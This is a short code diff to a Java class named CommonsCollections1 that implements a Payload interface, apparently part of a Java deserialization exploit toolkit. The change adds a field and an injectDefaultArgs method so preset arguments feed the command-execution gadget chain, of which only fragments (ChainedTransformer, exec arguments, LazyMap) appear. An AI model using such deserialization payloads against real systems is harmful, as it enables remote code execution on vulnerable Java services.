@@ -41,6 +41,8 @@ import org.apache.commons.collections.map.LazyMap;
  */
 public class CommonsCollections1 implements Payload {
 
+  private String[] args;
+
   public static boolean isApplicableJavaVersion() {
     return JavaVersion.isAnnInvHUniversalMethodImpl();
   }
@@ -56,6 +58,8 @@ public class CommonsCollections1 implements Payload {
    */
   @Override
   public Object getPayload(String[] args) throws Exception {
+    if (this.args != null)
+      args = this.args;
     final String[] execArgs = new String[]{args[0]};
     // inert chain for setup
     final Transformer transformerChain = new ChainedTransformer(
@@ -86,4 +90,10 @@ public class CommonsCollections1 implements Payload {
 
     return handler;
   }
+
+  @Override
+  public void injectDefaultArgs(String[] args) {
+    this.args = args;
+  }
+
 }
